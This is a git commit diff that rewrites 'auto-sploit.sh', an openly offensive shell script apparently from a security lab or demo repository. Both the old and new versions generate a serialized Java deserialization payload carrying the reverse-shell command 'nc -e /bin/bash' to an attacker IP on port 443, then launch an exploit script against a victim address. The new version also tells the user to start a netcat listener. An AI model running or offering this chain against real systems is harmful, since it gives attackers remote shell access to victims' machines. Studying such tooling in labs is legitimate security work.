427ee5035c6fc4910cf01c6cdd3e63f3bc251e68
jhseceng <justin.r.harris@hotmail.co.uk>
2021-06-24 20:14:45 +0100

    Updated auto-sploit script

--- attacker/auto-sploit.sh
+++ attacker/auto-sploit.sh
@@ -1,33 +1,12 @@
-#!/bin/sh
-usage() {
-  echo "Usage: auto-sploit -a [Attacker IP Address] -v [Target IP Address]"
-}
-
-while getopts ":a:v:" OPTION; do
-  case "$OPTION" in
-  a)
-    ATTACKER_IP="${OPTARG}"
-    ;;
-  v)
-    TARGET_ADDR="${OPTARG}"
-    ;;
-  h)
-    usage
-    ;;
-  esac
-done
-shift $((OPTIND - 1))
-
-echo $ATTACKER_IP
-echo $TARGET_ADDR
-if [ -z "$ATTACKER_IP" ] || [ -z "$TARGET_ADDR" ];then
-  usage
-fi
-
-    echo "Executing command..."
-    java -jar /root/payload.jar /root/payload.ser "nc -e /bin/bash $ATTACKER_IP 443"
-    echo "Payload successfully created and saved as 'payload.ser'"
-    echo "Executing exploit..."
-    python3 /root/exploit.py -t $TARGET_ADDR
-
-
+#! /bin/bash
+echo
+echo "*******************************************************************"
+echo
+echo "Open another terminal window and run a netcat listener: nc -lvp 443"
+echo "Creating Payload with IP address" $ATTACKER
+echo
+java -jar /root/payload.jar /root/payload.ser "nc -e /bin/bash $ATTACKER 443"
+echo "Payload successfully created and saved as 'payload.ser'"
+echo
+echo "Executing exploit..."
+python3 /root/exploit.py -t $VICTIM
